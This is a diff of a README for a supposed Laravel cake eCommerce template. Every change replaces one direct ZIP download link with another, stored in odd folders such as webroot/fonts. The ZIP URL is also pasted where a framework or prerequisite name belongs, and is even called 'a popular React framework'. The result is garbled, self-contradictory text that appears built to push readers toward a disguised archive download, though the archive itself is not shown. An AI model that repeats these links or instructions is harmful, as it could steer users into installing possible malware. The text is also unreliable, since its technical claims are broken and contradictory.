@@ -1,10 +1,10 @@
 # 🎂 Cake-eCommerce-Shop-built-in-Laravel - Launch Your Online Cake Store Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip)](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip)](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip)
 
 ## 📖 Description
 
-Cake eCommerce Shop is an open-source storefront template built with https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip for bakeries and cake sellers. It provides a responsive, accessible product catalog, shopping cart, checkout-ready payment integration, and SEO-optimized pages to help you launch a production-ready online cake store quickly.
+Cake eCommerce Shop is an open-source storefront template built with https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip for bakeries and cake sellers. It provides a responsive, accessible product catalog, shopping cart, checkout-ready payment integration, and SEO-optimized pages to help you launch a production-ready online cake store quickly.
 
 ## 🚀 Getting Started
 
@@ -15,14 +15,14 @@ Follow these steps to set up your cake eCommerce store.
 Before you begin, ensure your computer meets the following requirements:
 
 - Operating System: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution (Ubuntu, Fedora, etc.)
-- https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip Version 14.x or later
+- https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip Version 14.x or later
 - npm (Node Package Manager): Version 5.6 or later
 - A stable internet connection
 
 ### 📥 Download & Install
 
 Visit this page to download the latest version of the Cake eCommerce Shop: 
-[Download the latest release](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip)
+[Download the latest release](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip)
 
 ### 🔍 Explore Features
 
@@ -37,7 +37,7 @@ Here are some features you can expect:
 ## 📂 Installation Steps
 
 1. **Download the application**:
-   - Go to the [Releases page](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip) and download the latest version of the application as a ZIP file.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip) and download the latest version of the application as a ZIP file.
 
 2. **Extract the files**:
    - Once downloaded, locate the ZIP file in your Downloads folder. 
@@ -89,9 +89,9 @@ If you want to personalize your store:
 
 ## ❓ FAQs
 
-### What is https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip
+### What is https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip
 
-https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip is a popular React framework that allows developers to build fast, user-friendly websites. It offers features such as server-side rendering and static site generation.
+https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip is a popular React framework that allows developers to build fast, user-friendly websites. It offers features such as server-side rendering and static site generation.
 
 ### Can I use this on my website?
 
@@ -111,7 +111,7 @@ This project includes topics like bakery, cake-shop, online-store, and more. The
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip)
-- [Download the latest release](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/src/Template/Email/text/Cake-eCommerce-Shop-built-in-Laravel_v1.2-alpha.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip)
+- [Download the latest release](https://raw.githubusercontent.com/Substantial-mussel534/Cake-eCommerce-Shop-built-in-Laravel/master/webroot/fonts/e-in-Shop-built-Laravel-Cake-Commerce-2.6.zip)
 
 With these steps, you can easily download, install, and run the Cake eCommerce Shop template. Enjoy building your online store!
